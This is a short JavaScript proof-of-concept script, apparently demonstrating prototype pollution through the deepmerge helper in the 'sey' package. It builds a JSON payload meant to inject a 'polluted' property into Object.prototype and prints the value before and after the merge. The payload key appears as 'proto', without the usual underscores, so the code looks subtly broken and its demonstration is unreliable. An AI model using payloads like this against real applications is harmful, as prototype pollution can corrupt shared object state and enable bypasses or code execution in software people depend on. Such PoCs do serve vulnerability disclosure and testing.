var deepmerge = require("sey/lib/utils/deepmerge.js");

var obj = {};
var malicious_payload = '{"proto":{"polluted":"yes"}}';
console.log("Before: " + {}.polluted);
deepmerge({}, JSON.parse(malicious_payload));
console.log("After : " + {}.polluted);
